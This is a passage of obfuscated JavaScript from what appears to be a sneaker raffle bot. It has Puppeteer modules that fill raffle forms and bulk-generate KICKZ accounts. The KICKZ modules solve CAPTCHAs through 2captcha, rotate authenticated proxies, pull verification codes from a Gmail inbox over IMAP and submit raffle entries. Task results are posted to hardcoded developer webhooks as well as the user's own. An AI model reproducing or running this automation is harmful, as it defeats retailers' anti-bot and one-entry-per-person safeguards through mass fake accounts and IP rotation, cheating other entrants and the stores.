                            _0x14db3c['resourceType']() === 'image' || _0x14db3c['resourceType']() === 'font' || _0x14db3c['resourceType']() === 'media' ? _0x14db3c['abort']() : _0x14db3c['continue']();
                        }), await _0x31c1b8['goto']('' + _0x5a0756[_0x5e52fc]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x31c1b8['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20Filling\x20Information'), await _0x31c1b8['type']('#comp_firstname', '' + _0x5a0756[_0x5e52fc]['FirstName']), await _0x31c1b8['waitForSelector']('#comp_lastname'), await _0x31c1b8['type']('#comp_lastname', '' + _0x5a0756[_0x5e52fc]['LastName']), await _0x31c1b8['waitForSelector']('#comp_email'), await _0x31c1b8['type']('#comp_email', '' + _0x5a0756[_0x5e52fc]['Email']), await _0x31c1b8['waitForSelector']('#comp_paypalemail'), await _0x31c1b8['type']('#comp_paypalemail', '' + _0x5a0756[_0x5e52fc]['Email']), await _0x31c1b8['waitForSelector']('#comp_mobile_end'), await _0x31c1b8['type']('#comp_mobile_end', '' + _0x5a0756[_0x5e52fc]['Phone']), await _0x31c1b8['waitForSelector']('#comp_dob'), await _0x31c1b8['type']('#comp_dob', '08/09/1992'), console['log'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x5a0756[_0x5e52fc]['Size'] == 'RANDOM') {
                            const _0x4915b3 = await _0x31c1b8['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3df3cc => {
                                return _0x3df3cc['map'](_0x35dace => _0x35dace['value']);
                            });
                            var _0x3dafba = Math['round'](Math['random']() * (_0x4915b3['length'] - 0x2));
                            await _0x31c1b8['select']('#shoesize', _0x4915b3[_0x3dafba + 0x1]), await _0x1a79bd(0x3e8);
                        } else {
                            const _0xd4b29a = await _0x31c1b8['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x39dbb0 => {
                                return _0x39dbb0['map'](_0x5b5f7c => _0x5b5f7c['innerText']);
                            }), _0x9d2a05 = await _0x31c1b8['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x188e81 => {
                                return _0x188e81['map'](_0x109925 => _0x109925['value']);
                            });
                            var _0x54e885 = _0x5a0756[_0x5e52fc]['Size'];
                            for (var _0x4d7800 = 0x1; _0x4d7800 < _0x9d2a05['length']; _0x4d7800++) {
                                var _0x3ab9ea = _0xd4b29a[_0x4d7800]['split']('\x20')[0x0];
                                if (_0x3ab9ea == _0x54e885) {
                                    await _0x31c1b8['select']('#shoesize', _0x9d2a05[_0x4d7800]);
                                    break;
                                } else {
                                    if (_0x4d7800 + 0x1 == _0x9d2a05['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x31c1b8['waitForSelector']('#comp_address1'), await _0x31c1b8['type']('#comp_address1', _0x5a0756[_0x5e52fc]['Address1'] + '\x20' + _0x5a0756[_0x5e52fc]['HouseNumber']), await _0x31c1b8['waitForSelector']('#comp_address2'), await _0x31c1b8['type']('#comp_address2', '' + _0x5a0756[_0x5e52fc]['Address2']), await _0x31c1b8['waitForSelector']('#comp_address2'), await _0x31c1b8['type']('#comp_address3', '' + _0x5a0756[_0x5e52fc]['City']), await _0x31c1b8['waitForSelector']('#comp_postcode'), await _0x31c1b8['type']('#comp_postcode', '' + _0x5a0756[_0x5e52fc]['Zip']), console['log'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1a79bd(0x4b0), await _0x31c1b8['click']('label#emailhold'), await _0x1a79bd(0x5dc), await _0x31c1b8['click']('#preauth_tandc_email\x20>\x20label'), await _0x1a79bd(0x5dc), await _0x31c1b8['click']('#submit'), await _0x31c1b8['waitForSelector']('#paymentWrap'), console['log'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20' + _0x41d282['blue']('Awaiting\x20Paypal\x20Payment')), _0x4f2d88['on']('targetcreated', async _0x309621 => {
                            if (_0x309621['type']() === 'page') {
                                const _0x3ea215 = await _0x309621['page']();
                                async function _0xe08267() {
                                    try {
                                        await _0x31c1b8['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x5345fe = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x227d77() {
                                    try {
                                        await _0x31c1b8['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x12d590 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x227d77(), _0xe08267(), await _0x1a79bd(0x493e0);
                            }
                        });
                        async function _0x337fce() {
                            for (let _0x1d7a88 = 0x0; _0x1d7a88 < 0x12c; _0x1d7a88++) {
                                if (_0x12d590 == !![]) {
                                    _0xa02a44 = 'no', _0x4c6d06(_0x5a0756[_0x5e52fc], _0x53a8e4), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '')
                                        try {
                                            await _0x21228b(_0x37a01c['webhook'], _0x49e00a['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x49e00a['succesDEVMSG']), await _0x1a79bd(0xc8);
                                    try {
                                        await _0x21228b(_0x136ee7, _0x49e00a['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x5345fe)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x1a79bd(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x1a79bd(0xbb8), await _0x31c1b8['click']('.zoid-outlet'), await _0x1a79bd(0x7d0), await _0x337fce();
                    } catch (_0x3f8569) {
                        console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20' + _0x3f8569)), _0x2ccf16 = '' + _0x3f8569;
                        var _0x4f450f = await _0x550a27(_0x5a0756[_0x5e52fc], _0x53a8e4, 'dev', !![], _0x2ccf16);
                        _0x49e00a['errorDEV'] = { 'embeds': [_0x4f450f] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x49e00a['errorDEV']), await _0x21228b(_0x549818, _0x49e00a['errorDEV']);
                    } finally {
                        _0x4f2d88 && _0x4f2d88['close']();
                        if (_0xa02a44 == 'yes' && _0x35539e != 0x5 && _0x2ccf16 != 'Size\x20Not\x20Found') {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x53a8e4['name'] + ']\x20Task\x20' + (_0x5e52fc + 0x1) + '\x20:\x20Retrying')), _0x5e52fc = _0x5e52fc - 0x1, _0x35539e = _0x35539e + 0x1;
                            continue;
                        }
                        _0xa02a44 == 'yes' && _0x35539e >= 0x5 && (_0x2e4d36(afew[_0x5e52fc], _0x53a8e4), _0xa02a44 = 'no', _0x35539e = 0x0), console['log']('Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x4aeab2, _0x29e92c, _0x704ff4) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xdf6369 = 0x0; _0xdf6369 < _0x29e92c['length']; _0xdf6369++) {
                        const _0x3c7453 = 'https://www.kickz.com/login';
                        if (_0xe59999 != 'yes')
                            var _0xe59999 = '', _0x4109de = 0x0;
                        _0x219354(_0x4aeab2['name'] + '\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20/\x20' + _0x29e92c['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x29e92c, _0xdf6369);
                        var _0x28984a = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3da10f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37a01c['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3dc3b3
                                }
                            ]
                        }];
                        const _0x129a18 = { 'embeds': _0x28984a };
                        var _0x83420a = await _0x550a27(_0x29e92c[_0xdf6369], _0x4aeab2, 'acc', ![]);
                        const _0x18097b = { 'succesDEVMSG': { 'embeds': [_0x83420a] } };
                        if (_0x29e92c[_0xdf6369]['Email'] == '' || _0x29e92c[_0xdf6369]['FirstName'] == '' || _0x29e92c[_0xdf6369]['LastName'] == '') {
                            console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x29e92c[_0xdf6369]['Password'] == '' && (_0x29e92c[_0xdf6369]['Password'] = 'JRaffles23!');
                        if (_0x37a01c['useRandomProxy'] = ![])
                            var _0x4802f9 = _0x704ff4[_0xdf6369]['split'](':');
                        else
                            var _0x5244a7 = Math['round'](Math['random']() * (_0x704ff4['length'] - 0x1)), _0x4802f9 = _0x704ff4[_0x5244a7]['split'](':');
                        const _0x25b5a4 = await _0x198f78['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4802f9[0x0] + ':' + _0x4802f9[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x2d9d4e = await _0x25b5a4['newPage']();
                            await _0x2d9d4e['authenticate']({
                                'username': '' + _0x4802f9[0x2],
                                'password': '' + _0x4802f9[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d9d4e['setRequestInterception'](!![]), _0x2d9d4e['on']('request', _0x554e68 => {
                                _0x554e68['resourceType']() === 'image' || _0x554e68['resourceType']() === 'font' || _0x554e68['resourceType']() === 'media' ? _0x554e68['abort']() : _0x554e68['continue']();
                            }), await _0x2d9d4e['goto'](_0x3c7453), await _0x1a79bd(0xbb8), console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x2d9d4e['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2d9d4e['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x2d9d4e['waitForSelector']('#button-register'), await _0x1a79bd(0x7d0), await _0x2d9d4e['evaluate'](() => {
                                const _0xcf703 = document['querySelector']('#button-register');
                                _0xcf703['click']();
                            }), console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1a79bd(0x1388), await _0x2d9d4e['waitForSelector']('#customer_salutation'), await _0x2d9d4e['select']('#customer_salutation', 'mr'), await _0x1a79bd(0x7d0), await _0x2d9d4e['waitForSelector']('#customer_firstname'), await _0x2d9d4e['type']('#customer_firstname', '' + _0x29e92c[_0xdf6369]['FirstName']), await _0x1a79bd(0x352), await _0x2d9d4e['waitForSelector']('#customer_lastname'), await _0x2d9d4e['type']('#customer_lastname', '' + _0x29e92c[_0xdf6369]['LastName']), await _0x1a79bd(0x352), await _0x2d9d4e['type']('#email-input', '' + _0x29e92c[_0xdf6369]['Email']), await _0x1a79bd(0x352), await _0x2d9d4e['type']('#email-confirm-input', '' + _0x29e92c[_0xdf6369]['Email']), await _0x1a79bd(0x352), await _0x2d9d4e['type']('#register-password', '' + _0x29e92c[_0xdf6369]['Password']), await _0x1a79bd(0x352), await _0x2d9d4e['type']('#password-confirm', '' + _0x29e92c[_0xdf6369]['Password']), await _0x1a79bd(0x352), console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x2d9d4e['click']('#consent'), await _0x1a79bd(0x1f4);
                            const _0x56b972 = await _0x2d9d4e['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x56b972) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x2d9d4e['click']('#buttonRegister');
                            try {
                                await _0x2d9d4e['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x29e92c[_0xdf6369]['Email']), await _0x1a79bd(0x4b0);
                            async function _0x289425() {
                                var _0x250ae3, _0x5b16cb = ![];
                                for (var _0x2ae7a1 = 0x0; _0x2ae7a1 < 0x18; _0x2ae7a1++) {
                                    async function _0x225737() {
                                        var _0x4898dd = new _0x27a360({
                                            'user': _0x37a01c['masterMail'],
                                            'password': _0x37a01c['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5411f5(_0x1f05f3) {
                                            _0x4898dd['openBox']('INBOX', ![], _0x1f05f3);
                                        }
                                        _0x4898dd['once']('ready', function () {
                                            console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5411f5(function (_0x18fbae, _0x1c227d) {
                                                console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x18fbae)
                                                    throw _0x18fbae;
                                                _0x4898dd['seq']['search'](['UNSEEN'], function (_0x5f4eab, _0x5bde55) {
                                                    if (!_0x5bde55 || !_0x5bde55['length'])
                                                        console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x4898dd['end']();
                                                    else {
                                                        var _0x47dc0d = _0x4898dd['seq']['fetch'](_0x5bde55, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x47dc0d['on']('message', function (_0x3e8c43, _0x4ea804) {
                                                            var _0x484b36 = '(#' + _0x4ea804 + ')\x20';
                                                            _0x3e8c43['on']('body', function (_0xabab1c, _0x3c4205) {
                                                                _0x5d77b8(_0xabab1c, (_0x2236c0, _0x42160b) => {
                                                                    if (_0x42160b['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x9887bb = _0x42160b['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x1fef94 = _0x9887bb[0x1]['split']('<')[0x0];
                                                                        _0x250ae3 = _0x1fef94;
                                                                    }
                                                                });
                                                            }), _0x3e8c43['once']('end', function () {
                                                            });
                                                        }), _0x47dc0d['once']('error', function (_0x2ddbd2) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x47dc0d['once']('end', function () {
                                                            _0x4898dd['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x4898dd['once']('error', function (_0x4c27ff) {
                                            console['log'](_0x41d282['red'](_0x4c27ff['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5b16cb = !![];
                                        }), _0x4898dd['once']('end', async function () {
                                        }), _0x4898dd['connect']();
                                    }
                                    _0x225737(), await _0x1a79bd(0x1388);
                                    if (_0x250ae3)
                                        return _0x250ae3;
                                    if (_0x5b16cb)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x2ae7a1 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x289425(), _0x1a79bd(0x320), console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Verifying..'), await _0x2d9d4e['type']('#verificationCode', code), await _0x1a79bd(0x1f4), await _0x2d9d4e['click']('#buttonVerify'), await _0x1a79bd(0x190), await _0x2d9d4e['click']('#buttonVerify'), await _0x1a79bd(0x3e8);
                            try {
                                await _0x2d9d4e['waitForSelector']('div.b-user_greeting'), _0xe59999 = 'no', console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Account\x20' + _0x29e92c[_0xdf6369]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x496729['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x29e92c[_0xdf6369]['Email'] + ',' + _0x29e92c[_0xdf6369]['Password'] + ','), console['log'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Account\x20' + _0x29e92c[_0xdf6369]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x18097b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21228b(_0x1cab4c, _0x18097b['succesDEVMSG']);
                            } catch {
                                _0xe59999 = 'no', console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x10ef3c) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20' + _0x10ef3c)), _0x28984a[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x28984a[0x0]['description'] = '' + _0x10ef3c, await _0x21228b(_0x549818, _0x129a18), _0xe59999 = 'yes';
                        } finally {
                            _0x25b5a4 && _0x25b5a4['close']();
                            if (_0xe59999 == 'yes' && _0x4109de != 0x5) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x4aeab2['name'] + ']\x20Task\x20' + (_0xdf6369 + 0x1) + '\x20:\x20Retrying')), _0xdf6369 = _0xdf6369 - 0x1, _0x4109de = _0x4109de + 0x1;
                                continue;
                            }
                            _0xe59999 == 'yes' && _0x4109de >= 0x5 && (_0x2e4d36(_0x29e92c[_0xdf6369], _0x4aeab2), _0xe59999 = 'no', _0x4109de = 0x0), console['log']('Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x131733, _0x13ced4, _0x11ebf2) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x59d9b4 = 0x0; _0x59d9b4 < _0x13ced4['length']; _0x59d9b4++) {
                        var _0x124066;
                        if (_0x235479 != 'yes')
                            var _0x235479 = '', _0x3cba4f = 0x0;
                        _0x219354(_0x131733['name'] + '\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20/\x20' + _0x13ced4['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79);
                        var _0x498729 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3da10f
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x13ced4[_0x59d9b4]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x13ced4[_0x59d9b4]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37a01c['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3dc3b3
                                }
                            ]
                        }], _0x35c4ab = await _0x550a27(_0x13ced4[_0x59d9b4], _0x131733, 'dev', ![]), _0x1df117 = await _0x550a27(_0x13ced4[_0x59d9b4], _0x131733, 'pub', ![]);
                        const _0x5a1c53 = {
                            'succesDEVMSG': { 'embeds': [_0x35c4ab] },
                            'succesPUBMSG': { 'embeds': [_0x1df117] }
                        };
                        await _0x170817(_0x13ced4, _0x59d9b4);
                        if (_0x13ced4[_0x59d9b4]['Email'] == '' || _0x13ced4[_0x59d9b4]['Password'] == '' || _0x13ced4[_0x59d9b4]['FirstName'] == '' || _0x13ced4[_0x59d9b4]['LastName'] == '') {
                            console['log'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x37a01c['useRandomProxy'] = ![])
                            var _0x4dfcdc = _0x11ebf2[_0x59d9b4]['split'](':');
                        else
                            var _0x528306 = Math['round'](Math['random']() * (_0x11ebf2['length'] - 0x1)), _0x4dfcdc = _0x11ebf2[_0x528306]['split'](':');
                        const _0x142667 = await _0x198f78['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x4dfcdc[0x0] + ':' + _0x4dfcdc[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1136e9 = await _0x142667['newPage']();
                            await _0x1136e9['authenticate']({
                                'username': '' + _0x4dfcdc[0x2],
                                'password': '' + _0x4dfcdc[0x3]
                            }), console['log'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1136e9['setRequestInterception'](!![]), _0x1136e9['on']('request', _0xe6868d => {
                                _0xe6868d['resourceType']() === 'image' || _0xe6868d['resourceType']() === 'font' || _0xe6868d['resourceType']() === 'media' ? _0xe6868d['abort']() : _0xe6868d['continue']();
                            }), await _0x1136e9['goto']('' + _0x13ced4[_0x59d9b4]['Url'], { 'waitUntil': 'networkidle2' }), await _0x1a79bd(0x12c);
                            try {
                                await _0x1136e9['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x1136e9['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Logging\x20in'), await _0x1136e9['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1136e9['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1136e9['waitForSelector']('#username'), await _0x1136e9['type']('#username', _0x13ced4[_0x59d9b4]['Email']), await _0x1136e9['waitForSelector']('#password'), await _0x1136e9['type']('#password', _0x13ced4[_0x59d9b4]['Password']), await _0x1a79bd(0x190), await _0x1136e9['click']('#buttonSubmit'), await _0x1136e9['waitForSelector']('div.b-user_greeting'), console['log'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x1a79bd(0x1f4), await _0x1136e9['goto']('' + _0x13ced4[_0x59d9b4]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x13ced4[_0x59d9b4]['Size']);
                            let _0x3aa450 = _0x13ced4[_0x59d9b4]['Size']['replace']('.5', '\x201/2');
                            await _0x1136e9['click']('button[title=\x22' + _0x3aa450 + '\x22]'), await _0x1a79bd(0x1f4);
                            try {
                                await _0x1136e9['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x1a79bd(0x12c), console['log'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1136e9['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x1a79bd(0x12c), await _0x1136e9['type']('#dwfrm_raffle_addressFields_firstName', _0x13ced4[_0x59d9b4]['FirstName']), await _0x1a79bd(0x12c), await _0x1136e9['type']('#dwfrm_raffle_addressFields_lastName', _0x13ced4[_0x59d9b4]['LastName']), await _0x1a79bd(0x12c), await _0x1136e9['select']('#dwfrm_raffle_addressFields_country', _0x13ced4[_0x59d9b4]['Country']), await _0x1a79bd(0x12c), await _0x1136e9['type']('#dwfrm_raffle_addressFields_city', _0x13ced4[_0x59d9b4]['City']), await _0x1a79bd(0x12c);
                            _0x13ced4[_0x59d9b4]['Postcode'] == undefined && (_0x13ced4[_0x59d9b4]['Postcode'] = _0x13ced4[_0x59d9b4]['Zip']);
                            await _0x1136e9['type']('#dwfrm_raffle_addressFields_postalCode', _0x13ced4[_0x59d9b4]['Postcode']), await _0x1a79bd(0x12c), await _0x1136e9['type']('#dwfrm_raffle_addressFields_address1', _0x13ced4[_0x59d9b4]['Address1']), await _0x1a79bd(0x12c), await _0x1136e9['type']('#dwfrm_raffle_addressFields_address2', _0x13ced4[_0x59d9b4]['HouseNumber']), await _0x1a79bd(0x12c), await _0x1136e9['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x13ced4[_0x59d9b4]['Address2']), await _0x1a79bd(0x12c), await _0x1136e9['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x1a79bd(0x12c), await _0x1136e9['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x13ced4[_0x59d9b4]['Follower']), await _0x1a79bd(0x1f4), await _0x1136e9['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x1a79bd(0x1f4), console['log'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20' + _0x41d282['blue']('Awaiting\x20Paypal\x20Payment')), await _0x1136e9['click']('.b-paypal_button');
                            try {
                                await _0x1136e9['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x235479 = 'no', _0x4c6d06(_0x13ced4[_0x59d9b4], _0x131733), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x5a1c53['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x5a1c53['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x136ee7, _0x5a1c53['succesPUBMSG']);
                            } catch (_0x309698) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x131733['name'] + ']\x20Task\x20' + (_0x59d9b4 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x309698)), _0x124066 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x309698;
                                var _0x13e66c = await _0x550a27(_0x13ced4[_0x59d9b4], _0x131733, 'dev', !![], _0x124066);
